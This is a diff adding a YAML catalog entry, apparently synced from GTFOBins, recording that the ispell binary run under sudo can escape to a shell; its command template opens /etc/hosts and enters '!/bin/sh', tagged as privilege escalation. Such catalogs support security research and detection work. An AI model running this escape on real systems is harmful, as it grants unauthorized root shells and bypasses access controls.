@@ -1,0 +1,26 @@
+id: gtfobins/ispell/shell/sudo
+type: binary
+platform: linux
+name: ispell
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: 'ispell /etc/hosts
+
+    !/bin/sh'
+references:
+- https://gtfobins.github.io/gtfobins/ispell/
+tags:
+- linux
+- unix
+- gtfobins
